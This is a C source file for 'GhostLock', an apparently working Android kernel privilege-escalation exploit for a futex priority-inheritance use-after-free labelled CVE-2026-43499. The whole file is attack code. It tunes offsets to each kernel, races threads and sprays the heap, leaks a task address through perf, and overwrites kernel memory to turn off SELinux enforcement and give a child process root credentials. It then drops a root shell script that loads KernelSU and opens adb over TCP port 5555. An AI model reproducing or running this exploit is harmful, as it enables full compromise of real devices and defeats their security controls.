/*
 * GhostLock — CVE-2026-43499 futex PI UAF exploit
 *
 * Phase 1: Write 1 — SELinux permissive (child-node PI write)
 * Phase 2: Write 2 — cred = init_cred (child-node PI write via perf task leak)
 */

#include "common.h"
#include "offsets.h"
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <linux/perf_event.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/utsname.h>

static const struct kernel_offsets *active_offsets = NULL;

/* Override target.h macros with dynamic offsets from offsets.h table */
#undef KIMAGE_TEXT_BASE
#define KIMAGE_TEXT_BASE              active_offsets->kimage_text_base

/* Struct field offsets */
#undef TASK_CRED_OFF
#undef TASK_REAL_CRED_OFF
#undef TASK_PID_OFF
#undef TASK_TGID_OFF
#undef TASK_REAL_PARENT_OFF
#undef TASK_COMM_OFF
#undef TASK_TASKS_OFF
#undef TASK_ATOMIC_FLAGS_OFF
#undef TASK_SECCOMP_OFF
#undef MM_OWNER_OFF
#undef FAKE_TASK_USAGE_OFF
#undef FAKE_TASK_PRIO_OFF
#undef FAKE_TASK_NORMAL_PRIO_OFF
#undef FAKE_TASK_TASK_GROUP_OFF
#undef FAKE_TASK_PI_LOCK_OFF
#undef FAKE_TASK_PI_WAITERS_OFF
#undef FAKE_TASK_PI_TOP_TASK_OFF
#undef FAKE_TASK_PI_BLOCKED_ON_OFF
#undef WAITER_TREE_ENTRY_OFF
#undef WAITER_PI_TREE_ENTRY_OFF
#undef WAITER_TASK_OFF
#undef WAITER_LOCK_OFF
#undef WAITER_WAKE_STATE_OFF
#undef WAITER_PRIO_OFF
#undef WAITER_DEADLINE_OFF
#undef WAITER_WW_CTX_OFF
#undef CRED_UID_OFF
#undef CRED_SECUREBITS_OFF
#undef CRED_CAPS_OFF
#undef CRED_SECURITY_OFF
#undef FOPS_OWNER_OFF
#undef FOPS_LLSEEK_OFF
#undef FOPS_READ_OFF
#undef FOPS_WRITE_OFF
#undef FOPS_READ_ITER_OFF
#undef FOPS_WRITE_ITER_OFF
#undef FOPS_IOCTL_OFF
#undef FOPS_COMPAT_IOCTL_OFF
#undef FOPS_MMAP_OFF
#undef FOPS_OPEN_OFF
#undef FOPS_RELEASE_OFF
#undef FOPS_SPLICE_READ_OFF
#undef FOPS_SHOW_FDINFO_OFF

#define TASK_CRED_OFF                 active_offsets->task_cred
#define TASK_REAL_CRED_OFF            active_offsets->task_real_cred
#define TASK_PID_OFF                  active_offsets->task_pid
#define TASK_TGID_OFF                 active_offsets->task_tgid
#define TASK_REAL_PARENT_OFF          active_offsets->task_real_parent
#define TASK_COMM_OFF                 active_offsets->task_comm
#define TASK_TASKS_OFF                active_offsets->task_tasks
#define TASK_ATOMIC_FLAGS_OFF         active_offsets->task_atomic_flags
#define TASK_SECCOMP_OFF              active_offsets->task_seccomp
#define MM_OWNER_OFF                  active_offsets->mm_owner
#define FAKE_TASK_USAGE_OFF           active_offsets->task_usage
#define FAKE_TASK_PRIO_OFF            active_offsets->task_prio
#define FAKE_TASK_NORMAL_PRIO_OFF     active_offsets->task_normal_prio
#define FAKE_TASK_TASK_GROUP_OFF      active_offsets->task_sched_task_group
#define FAKE_TASK_PI_LOCK_OFF         active_offsets->task_pi_lock
#define FAKE_TASK_PI_WAITERS_OFF      active_offsets->task_pi_waiters
#define FAKE_TASK_PI_TOP_TASK_OFF     active_offsets->task_pi_top_task
#define FAKE_TASK_PI_BLOCKED_ON_OFF   active_offsets->task_pi_blocked_on
#define WAITER_TREE_ENTRY_OFF         active_offsets->waiter_tree
#define WAITER_PI_TREE_ENTRY_OFF      active_offsets->waiter_pi_tree
#define WAITER_TASK_OFF               active_offsets->waiter_task
#define WAITER_LOCK_OFF               active_offsets->waiter_lock
#define WAITER_WAKE_STATE_OFF         active_offsets->waiter_wake_state
#define WAITER_PRIO_OFF               active_offsets->waiter_prio
#define WAITER_DEADLINE_OFF           active_offsets->waiter_deadline
#define WAITER_WW_CTX_OFF             active_offsets->waiter_ww_ctx
#define CRED_UID_OFF                  active_offsets->cred_uid
#define CRED_SECUREBITS_OFF           active_offsets->cred_securebits
#define CRED_CAPS_OFF                 active_offsets->cred_caps
#define CRED_SECURITY_OFF             active_offsets->cred_security
#define FOPS_OWNER_OFF                active_offsets->fops_owner
#define FOPS_LLSEEK_OFF               active_offsets->fops_llseek
#define FOPS_READ_OFF                 active_offsets->fops_read
#define FOPS_WRITE_OFF                active_offsets->fops_write
#define FOPS_READ_ITER_OFF            active_offsets->fops_read_iter
#define FOPS_WRITE_ITER_OFF           active_offsets->fops_write_iter
#define FOPS_IOCTL_OFF                active_offsets->fops_ioctl
#define FOPS_COMPAT_IOCTL_OFF         active_offsets->fops_compat_ioctl
#define FOPS_MMAP_OFF                 active_offsets->fops_mmap
#define FOPS_OPEN_OFF                 active_offsets->fops_open
#define FOPS_RELEASE_OFF              active_offsets->fops_release
#define FOPS_SPLICE_READ_OFF          active_offsets->fops_splice_read
#define FOPS_SHOW_FDINFO_OFF          active_offsets->fops_show_fdinfo

/* Global symbol offsets */
#undef SELINUX_ENFORCING_OFF
#undef INIT_CRED_OFF
#undef INIT_TASK_OFF
#undef INIT_UTS_NS_OFF
#undef EMPTY_ZERO_PAGE_OFF
#undef ROOT_TASK_GROUP_OFF
#undef KPTR_RESTRICT_OFF
#undef SELINUX_BLOB_SIZES_OFF
#undef SECURITY_HOOK_HEADS_OFF
#undef KMALLOC_CACHES_OFF
#undef ANON_PIPE_BUF_OPS_OFF
#undef ASHMEM_MISC_FOPS_OFF
#undef ASHMEM_FOPS_OFF
#undef ASHMEM_IOCTL_OFF
#undef ASHMEM_COMPAT_IOCTL_OFF
#undef ASHMEM_MMAP_OFF
#undef ASHMEM_OPEN_OFF
#undef ASHMEM_RELEASE_OFF
#undef ASHMEM_SHOW_FDINFO_OFF
#undef CONFIGFS_READ_ITER_OFF
#undef CONFIGFS_BIN_WRITE_ITER_OFF
#undef COPY_SPLICE_READ_OFF
#undef NOOP_LLSEEK_OFF
#undef CAP_CAPABLE_ACTIVE_OFF
#undef SLIDE_NFULNL_LOGGER_OFF
#undef SLIDE_LOGGERS_0_1_OFF
#undef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#undef SLIDE_SYSCTL_BOOTID_OFF

#define SELINUX_ENFORCING_OFF         active_offsets->off_selinux_enforcing
#define INIT_CRED_OFF                 active_offsets->off_init_cred
#define INIT_TASK_OFF                 active_offsets->off_init_task
#define INIT_UTS_NS_OFF               active_offsets->off_init_uts_ns
#define EMPTY_ZERO_PAGE_OFF           active_offsets->off_empty_zero_page
#define ROOT_TASK_GROUP_OFF           active_offsets->off_root_task_group
#define KPTR_RESTRICT_OFF             active_offsets->off_kptr_restrict
#define SELINUX_BLOB_SIZES_OFF        active_offsets->off_selinux_blob_sizes
#define SECURITY_HOOK_HEADS_OFF       active_offsets->off_security_hook_heads
#define KMALLOC_CACHES_OFF            active_offsets->off_kmalloc_caches
#define ANON_PIPE_BUF_OPS_OFF         active_offsets->off_anon_pipe_buf_ops
#define ASHMEM_MISC_FOPS_OFF          active_offsets->off_ashmem_misc_fops
#define ASHMEM_FOPS_OFF               active_offsets->off_ashmem_fops
#define ASHMEM_IOCTL_OFF              active_offsets->off_ashmem_ioctl
#define ASHMEM_COMPAT_IOCTL_OFF       active_offsets->off_ashmem_compat_ioctl
#define ASHMEM_MMAP_OFF               active_offsets->off_ashmem_mmap
#define ASHMEM_OPEN_OFF               active_offsets->off_ashmem_open
#define ASHMEM_RELEASE_OFF            active_offsets->off_ashmem_release
#define ASHMEM_SHOW_FDINFO_OFF        active_offsets->off_ashmem_show_fdinfo
#define CONFIGFS_READ_ITER_OFF        active_offsets->off_configfs_read_iter
#define CONFIGFS_BIN_WRITE_ITER_OFF   active_offsets->off_configfs_bin_write_iter
#define COPY_SPLICE_READ_OFF          active_offsets->off_copy_splice_read
#define NOOP_LLSEEK_OFF               active_offsets->off_noop_llseek
#define CAP_CAPABLE_ACTIVE_OFF        active_offsets->off_cap_capable_active
#define SLIDE_NFULNL_LOGGER_OFF       active_offsets->off_slide_nfulnl_logger
#define SLIDE_LOGGERS_0_1_OFF         active_offsets->off_slide_loggers_0_1
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF active_offsets->off_slide_boot_id
#define SLIDE_SYSCTL_BOOTID_OFF       active_offsets->off_slide_boot_id

static int select_offsets(void) {
  struct utsname uts;
  if (uname(&uts) < 0) return -1;
  pr_info("kernel: %s\n", uts.release);
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) == 0) {
      active_offsets = &known_offsets[i];
      pr_success("offsets matched: %s\n", active_offsets->uname_r);
      return 0;
    }
  }
  pr_error("no offsets for kernel: %s\n", uts.release);
  pr_error("add this kernel to offsets.h and rebuild\n");
  return -1;
}

static struct timespec t0;
static void timer_reset(void) { clock_gettime(CLOCK_MONOTONIC, &t0); }
static double timer_ms(void) {
  struct timespec now;
  clock_gettime(CLOCK_MONOTONIC, &now);
  return (now.tv_sec - t0.tv_sec) * 1000.0 + (now.tv_nsec - t0.tv_nsec) / 1e6;
}
#define TIMER(label) pr_info("[T+%.0fms] %s\n", timer_ms(), label)

extern int pselect_custom_write;
extern uintptr_t pselect_custom_target;
extern uintptr_t pselect_custom_value;
extern int pselect_child_node;
void set_pselect_write_mode(uintptr_t target, uintptr_t value, int mode);
void clear_pselect_write(void);

uint32_t f_wait;
uint32_t f_pi_target;
uint32_t f_pi_chain;
atomic_int waiter_ready;
atomic_int waiter_waiting;
atomic_int owner_started;
atomic_int owner_chain_done;
atomic_int route_done;
atomic_int waiter_tid;
atomic_int punch_consume_go;
atomic_int punch_consume_stop;
atomic_int consumer_calls;
atomic_int consumer_success;
atomic_int main_route_delay_usec;
atomic_int pipe_prepare_request;
atomic_int pipe_prepare_done;
int memfd_leak;

void *waiter_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  int tid = (int)syscall(SYS_gettid);
  atomic_store(&waiter_tid, tid);
  if (futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0) != 0)
    pr_error("waiter lock chain errno=%d\n", errno);
  atomic_store(&waiter_ready, 1);
  while (!atomic_load(&owner_started)) usleep(1000);
  struct timespec timeout;
  SYSCHK(clock_gettime(CLOCK_MONOTONIC, &timeout));
  timeout.tv_sec += ROUTE_WAIT_SECONDS;
  atomic_store(&waiter_waiting, 1);
  futex_op(&f_wait, FUTEX_WAIT_REQUEUE_PI, 0, &timeout, &f_pi_target, 0);
  do_pselect_fake_lock_route();
  atomic_store(&route_done, 1);
  futex_op(&f_pi_chain, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
  while (!atomic_load(&owner_chain_done)) usleep(1000);
  return NULL;
}

void *owner_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long lock_target = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  if (lock_target != 0) pr_error("owner lock target errno=%d\n", errno);
  while (!atomic_load(&waiter_ready)) usleep(1000);
  atomic_store(&owner_started, 1);
  futex_op(&f_pi_chain, FUTEX_LOCK_PI, 0, NULL, NULL, 0);
  atomic_store(&owner_chain_done, 1);
  for (;;) sleep(1);
}

void *consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  int seen = 0;
  while (!atomic_load(&punch_consume_stop)) {
    int seq = atomic_load(&punch_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      continue;
    }
    seen = seq;
    int tid = atomic_load(&waiter_tid);
    int calls_this_seq = 0;
    while (!atomic_load(&punch_consume_stop) &&
           atomic_load(&punch_consume_go) == seq) {
      int delay_usec = atomic_load(&main_route_delay_usec);
      if (delay_usec > 0) usleep((useconds_t)delay_usec);
      for (int burst = 0; burst < PSELECT_CONSUMER_BURST_CALLS; burst++) {
        if (atomic_load(&punch_consume_stop) ||
            atomic_load(&punch_consume_go) != seq) break;
        atomic_fetch_add(&consumer_calls, 1);
        errno = 0;
        long sched_ret = sched_setattr_tid(tid, PSELECT_CONSUMER_NICE);
        if (sched_ret != 0) {
          struct timespec ft = {.tv_sec = 0, .tv_nsec = 50000000};
          long fret = futex_op(&f_pi_target, FUTEX_LOCK_PI, 0, &ft, NULL, 0);
          if (fret == 0) {
            futex_op(&f_pi_target, FUTEX_UNLOCK_PI, 0, NULL, NULL, 0);
            sched_ret = 0;
          }
        }
        if (sched_ret == 0) atomic_fetch_add(&consumer_success, 1);
        calls_this_seq++;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }
  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0; f_pi_target = 0; f_pi_chain = 0;
  atomic_store(&waiter_ready, 0); atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0); atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0); atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0); atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0); atomic_store(&consumer_success, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  atomic_store(&pipe_prepare_request, 0); atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0; cfi_last_errno = 0;
}

void run_main_route_threads(void) {
  reset_main_route_state();
  pthread_t waiter, owner, consumer;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started))
    usleep(1000);
  usleep(50000);
  errno = 0;
  futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  while (!atomic_load(&route_done)) usleep(5000);
}

static int do_one_write(uintptr_t target, const char *desc, int mode) {
  pr_info("=== %s === target=0x%016zx mode=%d\n", desc, target, mode);
  pselect_child_node = 1;
  set_pselect_write_mode(target, 0, mode);
  TIMER("  heap spray start");
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
  if (!page_base) { pr_error("  heap spray failed\n"); clear_pselect_write(); return 0; }
  TIMER("  heap spray done");
  run_main_route_threads();
  TIMER("  PI route done");
  clear_pselect_write();
  return 1;
}

static int check_selinux_off(void) {
  int efd = open("/sys/fs/selinux/enforce", O_RDONLY);
  if (efd < 0) return 1;
  char b[4] = {0};
  read(efd, b, sizeof(b));
  close(efd);
  return b[0] == '0';
}

static void slab_drain(void) {
  struct timespec up;
  clock_gettime(CLOCK_BOOTTIME, &up);
  int waves = (up.tv_sec > 60) ? 5 : 2;
  int batch = (up.tv_sec > 60) ? 400 : 200;
  for (int wave = 0; wave < waves; wave++) {
    pid_t *drain = calloc(batch, sizeof(pid_t));
    int n = 0;
    for (int i = 0; i < batch; i++) {
      drain[i] = fork();
      if (drain[i] == 0) { pause(); _exit(0); }
      if (drain[i] > 0) n++;
    }
    for (int i = 0; i < n; i++) {
      kill(drain[i], SIGKILL);
      waitpid(drain[i], NULL, 0);
    }
    free(drain);
    sched_yield();
  }
}

static void write_root_script(void) {
  int sfd = open("/data/local/tmp/.ghostlock_root.sh", O_WRONLY|O_CREAT|O_TRUNC, 0755);
  if (sfd < 0) return;
  const char *script =
    "#!/system/bin/sh\n"
    "echo '[+] root shell pid='$$ 'uid='$(id -u)\n"
    "KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -z \"$KSUD\" ]; then KSUD=/data/adb/ksu/bin/ksud; fi\n"
    "if grep -q kernelsu /proc/modules 2>/dev/null; then\n"
    "  echo '[+] KernelSU already loaded'\n"
    "elif [ -x \"$KSUD\" ] || [ -f \"$KSUD\" ]; then\n"
    "  echo '[*] ksud:' $KSUD\n"
    "  chmod 755 \"$KSUD\" 2>/dev/null\n"
    "  KVER=$(uname -r | cut -d. -f1-2)\n"
    "  AVER=$(uname -r | grep -o 'android[0-9]*')\n"
    "  KMI=\"${AVER}-${KVER}\"\n"
    "  echo '[*] KMI=' $KMI\n"
    "  mkdir -p /data/adb/ksu 2>/dev/null\n"
    "  echo '[*] ksud late-load --kmi' $KMI\n"
    "  setsid \"$KSUD\" late-load --kmi \"$KMI\" </dev/null >/dev/null 2>&1 &\n"
    "  KSUD_PID=$!\n"
    "  echo '[*] ksud pid='$KSUD_PID\n"
    "  for w in $(seq 1 30); do\n"
    "    grep -q kernelsu /proc/modules 2>/dev/null && break\n"
    "    sleep 1\n"
    "  done\n"
    "  grep -q kernelsu /proc/modules 2>/dev/null && echo '[+] KSU LOADED' || echo '[!] KSU NOT loaded'\n"
    "  grep kernelsu /proc/modules && echo '[+] KSU loaded' || echo '[!] KSU NOT loaded'\n"
    "fi\n"
    "RSPROP=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
    "if [ -n \"$RSPROP\" ]; then\n"
    "  chmod 755 \"$RSPROP\" 2>/dev/null\n"
    "  \"$RSPROP\" resetprop -p persist.adb.tcp.port 5555 2>&1 && echo '[+] persist.adb.tcp.port=5555 set via resetprop'\n"
    "  \"$RSPROP\" resetprop service.adb.tcp.port 5555 2>/dev/null\n"
    "fi\n"
    "rm -f /data/local/tmp/.ghostlock_w1\n"
    "APK=$(pm path com.resukisu.resukisu 2>/dev/null | sed 's/package://')\n"
    "if [ -n \"$APK\" ] && [ -x /data/adb/ksud ]; then\n"
    "  /data/adb/ksud kernel dynamic-manager set-apk \"$APK\" 2>/dev/null && echo '[+] dynamic manager set'\n"
    "fi\n"
    "echo 1 > /sys/fs/selinux/enforce 2>/dev/null\n"
    "echo '[*]' $(id) 'enforce='$(cat /sys/fs/selinux/enforce 2>/dev/null)\n"
    "echo '[+] done'\n"
    "if [ -t 0 ]; then exec /system/bin/sh -i; fi\n";
  write(sfd, script, strlen(script));
  close(sfd);
}

/* perf_find_task - only used when perf is available (shell context) */
static uintptr_t perf_find_task(void) {
  struct perf_event_attr pe;
  memset(&pe, 0, sizeof(pe));
  pe.type = PERF_TYPE_SOFTWARE;
  pe.size = sizeof(pe);
  pe.config = PERF_COUNT_SW_CPU_CLOCK;
  pe.sample_period = 5000;
  pe.sample_type = PERF_SAMPLE_IP | PERF_SAMPLE_REGS_INTR;
  pe.sample_regs_intr = (1ULL << 32) - 1;
  pe.disabled = 1;
  pe.exclude_user = 1;
  pe.exclude_hv = 1;
  pe.exclude_idle = 1;

  errno = 0;
  int fd = (int)syscall(__NR_perf_event_open, &pe, 0, -1, -1, 0);
  if (fd < 0) { pr_error("perf_event_open failed errno=%d\n", errno); return 0; }
  size_t msz = 4096 * (1 + 32);
  void *buf = mmap(NULL, msz, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
  if (buf == MAP_FAILED) { pr_error("perf mmap failed errno=%d\n", errno); close(fd); return 0; }
  ioctl(fd, PERF_EVENT_IOC_ENABLE, 0);
  for (volatile int i = 0; i < 500000; i++) syscall(__NR_getpid);
  ioctl(fd, PERF_EVENT_IOC_DISABLE, 0);
  struct perf_event_mmap_page *hdr = buf;
  uint64_t head = hdr->data_head;
  __sync_synchronize();
  char *base = (char *)buf + 4096;
  size_t dsz = 4096 * 32;
  uint64_t pos = hdr->data_tail;
  uintptr_t cands[256]; int nc = 0;
  while (pos < head && nc < 256) {
    struct perf_event_header *ev = (void *)(base + (pos % dsz));
    if (ev->size == 0) break;
    if (ev->type == PERF_RECORD_SAMPLE) {
      char *p = (char *)ev + sizeof(*ev);
      p += 8; /* skip IP */
      uint64_t abi = *(uint64_t *)p; p += 8;
      if (abi == 1 || abi == 2) {
        uint64_t *regs = (uint64_t *)p;
        for (int i = 0; i < 32 && nc < 256; i++) {
          uint64_t v = regs[i];
          if (v > 0xffffff8000000000ULL && v < 0xfffffffe00000000ULL)
            cands[nc++] = v;
        }
      }
    }
    pos += ev->size;
  }
  hdr->data_tail = head; munmap(buf, msz); close(fd);
  if (!nc) return 0;
  uintptr_t best = 0; int best_cnt = 0;
  for (int i = 0; i < nc; i++) {
    int cnt = 0;
    for (int j = 0; j < nc; j++) if (cands[j] == cands[i]) cnt++;
    if (cnt > best_cnt) { best_cnt = cnt; best = cands[i]; }
  }
  pr_info("perf task: 0x%016zx (%d/%d votes)\n", best, best_cnt, nc);
  return best;
}

struct child_pipes { int task_r, task_w, cmd_r, cmd_w, uid_r, uid_w; };

static void child_main(struct child_pipes *p) {
  close(p->task_r); close(p->cmd_w); close(p->uid_r);
  uintptr_t my_task = perf_find_task();
  write(p->task_w, &my_task, sizeof(my_task));
  close(p->task_w);
  if (!my_task) _exit(1);
  char cmd;
  while (read(p->cmd_r, &cmd, 1) == 1) {
    if (cmd == 'C') { uint32_t uid = getuid(); write(p->uid_w, &uid, sizeof(uid)); }
    else if (cmd == 'G') break;
  }
  close(p->cmd_r); close(p->uid_w);
  if (getuid() != 0) _exit(1);
  pid_t gc = fork();
  if (gc == 0) {
    int efd = open("/sys/fs/selinux/enforce", O_WRONLY);
    if (efd >= 0) { write(efd, "0", 1); close(efd); }
    execl("/system/bin/sh", "sh", "/data/local/tmp/.ghostlock_root.sh", NULL);
    _exit(1);
  }
  if (gc > 0) waitpid(gc, NULL, 0);
  for (;;) pause();
}

static pid_t spawn_child(struct child_pipes *p) {
  int p1[2], p2[2], p3[2];
  if (pipe(p1) < 0 || pipe(p2) < 0 || pipe(p3) < 0) return -1;
  p->task_r = p1[0]; p->task_w = p1[1];
  p->cmd_r = p2[0]; p->cmd_w = p2[1];
  p->uid_r = p3[0]; p->uid_w = p3[1];
  pid_t child = fork();
  if (child < 0) return -1;
  if (child == 0) { child_main(p); _exit(1); }
  close(p->task_w); close(p->cmd_r); close(p->uid_w);
  return child;
}

int run_exploit(int argc, char **argv) {
  (void)argc; (void)argv;
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();

  if (!active_offsets && select_offsets() < 0) return 1;

  log_startup_context();
  init_ashmem_path();
  pin_to_core(CORE);

  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  timer_reset();
  TIMER("exploit start");

  write_root_script();

  /* Phase 1: Disable SELinux */
  int selinux_ok = check_selinux_off();
  if (!selinux_ok) {
    slab_drain();
    TIMER("pre-W1 drain");
    for (int att = 1; att <= 5 && !selinux_ok; att++) {
      pr_info("Write 1 attempt %d/5\n", att);
      do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
      usleep(100000);
      if (check_selinux_off()) { pr_success("SELinux DISABLED\n"); selinux_ok = 1; }
    }
    if (!selinux_ok) { pr_error("Write 1 failed\n"); return 1; }
    TIMER("Write 1 complete");
  } else {
    pr_success("SELinux already off\n");
  }

  /* Phase 2: Find child task_struct + cred overwrite */
  slab_drain();
  TIMER("pre-W2 drain");

  struct child_pipes pipes;
  pid_t child = spawn_child(&pipes);
  if (child < 0) { pr_error("fork failed\n"); return 1; }

  uintptr_t child_task = 0;
  read(pipes.task_r, &child_task, sizeof(child_task));
  close(pipes.task_r);
  TIMER("perf_find_task done");

  if (!child_task) {
    /* perf failed (seccomp?) — retry once */
    pr_info("perf returned 0, retrying...\n");
    waitpid(child, NULL, 0);
    child = spawn_child(&pipes);
    if (child < 0) { pr_error("retry fork failed\n"); return 1; }
    read(pipes.task_r, &child_task, sizeof(child_task));
    close(pipes.task_r);
  }

  if (!child_task) {
    pr_error("Cannot find task_struct (perf blocked by seccomp?)\n");
    close(pipes.cmd_w);
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_info("child_pid=%d child_task=0x%016zx\n", child, child_task);
  pselect_child_node = 1;

  int got_root = 0;
  for (int round = 1; round <= 10 && !got_root; round++) {
    pr_info("round %d/10: cred write\n", round);
    slab_drain();
    do_one_write(child_task + TASK_CRED_OFF, "W2: cred", 2);
    usleep(50000);
    write(pipes.cmd_w, "C", 1);
    uint32_t child_uid = 9999;
    read(pipes.uid_r, &child_uid, sizeof(child_uid));
    pr_info("child uid = %u\n", child_uid);
    if (child_uid == 0) { pr_success("child is root!\n"); got_root = 1; }
  }

  write(pipes.cmd_w, "G", 1);
  close(pipes.cmd_w); close(pipes.uid_r);

  if (!got_root) {
    pr_error("failed after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }

  sleep(2);
  TIMER("exploit complete");

  /* Wait for KSU su to become available, then fix SELinux policycap */
  pr_info("waiting for su...\n");
  for (int i = 0; i < 60; i++) {
    if (system("su -c 'id' > /dev/null 2>&1") == 0) {
      pr_success("su ready, fixing SELinux policy\n");
      system("su -c 'load_policy /sys/fs/selinux/policy' > /dev/null 2>&1");
      pr_success("load_policy done\n");
      break;
    }
    sleep(1);
  }

  return 0;
}

int install_embedded_wallpaper(void) { return 0; }

static int run_write1_only(void);
extern int mini_adb_shell(const char *cmd);

/* --bootstrap mode: runs from app context (any UID, with seccomp).
 * 1) Write 1 → SELinux off
 * 2) setprop to enable adb TCP on 5555 (SELinux off → property_service allows it)
 * 3) mini-adb connects to 127.0.0.1:5555, authenticates with pre-pushed key,
 *    runs full exploit via adb shell (no app seccomp → perf works)
 */
static int run_bootstrap(void) {
  log_startup_context();

  int ret = run_write1_only();
  if (ret != 0) return ret;

  /* Wait for adb TCP on port 5555 */
  pr_info("Waiting for adb TCP on port 5555...\n");
  for (int i = 0; i < 30; i++) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in addr = {
      .sin_family = AF_INET,
      .sin_port = htons(5555),
      .sin_addr.s_addr = htonl(0x7f000001)
    };
    int c = (sock >= 0) ? connect(sock, (struct sockaddr *)&addr, sizeof(addr)) : -1;
    if (sock >= 0) close(sock);
    if (c == 0) {
      pr_success("adbd ready on port 5555 (attempt %d)\n", i + 1);
      goto tcp_ready;
    }
    usleep(1000000);
  }
  pr_error("adbd not on TCP 5555 after 30s\n");
  return 1;
tcp_ready:
  usleep(200000);
  pr_info("Connecting via mini-adb...\n");
  int adb_ret = mini_adb_shell("/data/local/tmp/a/e");
  pr_info("mini-adb returned %d\n", adb_ret);

  return adb_ret;
}

static int run_write1_only(void) {
  disable_rseq_for_thread();
  set_unbuffer();
  set_limit();
  if (!active_offsets && select_offsets() < 0) return 1;
  init_ashmem_path();
  pin_to_core(CORE);
  kaslr_slide = 0;
  kaslr_base = KIMAGE_TEXT_BASE;
  kaslr_done = 1;

  if (check_selinux_off()) {
    pr_success("SELinux already off\n");
    return 0;
  }

  for (int att = 1; att <= 20; att++) {
    slab_drain();
    pr_info("Write 1 attempt %d/20\n", att);
    do_one_write(data_addr(SELINUX_ENFORCING), "W1: SELinux", 1);
    usleep(100000);
    if (check_selinux_off()) {
      pr_success("SELinux DISABLED\n");
      return 0;
    }
  }
  pr_error("Write 1 failed after 20 attempts\n");
  return 1;
}

int main(int argc, char **argv) {
    if (argc > 1 && strcmp(argv[1], "--bootstrap") == 0)
        return run_bootstrap();
    if (argc > 1 && strcmp(argv[1], "--write1") == 0)
        return run_write1_only();
    return run_exploit(argc, argv);
}
